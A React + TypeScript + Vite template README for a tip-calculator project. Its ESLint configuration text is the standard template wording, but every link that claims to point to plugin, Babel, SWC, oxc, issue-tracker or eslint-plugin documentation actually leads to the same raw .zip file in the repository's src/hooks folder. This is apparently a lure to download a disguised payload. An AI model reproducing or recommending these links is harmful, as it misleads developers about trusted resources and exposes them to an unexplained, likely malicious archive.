# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) uses [Babel](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) (or [oxc](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) when used in [rolldown-vite](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) uses [SWC](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) for Fast Refresh

## React Compiler

The React Compiler is currently not compatible with SWC. See [this issue](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) for tracking the progress.

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove tseslint.configs.recommended and replace with this
      tseslint.configs.recommendedTypeChecked,
      // Alternatively, use this for stricter rules
      tseslint.configs.strictTypeChecked,
      // Optionally, add this for stylistic rules
      tseslint.configs.stylisticTypeChecked,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['./tsconfig.node.json', './tsconfig.app.json'],
        tsconfigRootDir: import.meta.dirname,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/isra-osvaldo/calculadora-propinas/main/src/hooks/propinas-calculadora-1.2.zip) for React-specific lint rules:

```js
// eslint.config.js
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      reactX.configs['recommended-typescript'],
      // Enable lint rules for React DOM
      reactDom.configs.recommended,
    ],
    languageOptions: {
      parserOptions: {
        project: ['./tsconfig.node.json', './tsconfig.app.json'],
        tsconfigRootDir: import.meta.dirname,
      },
      // other options...
    },
  },
])
```
# calculadora-propinas
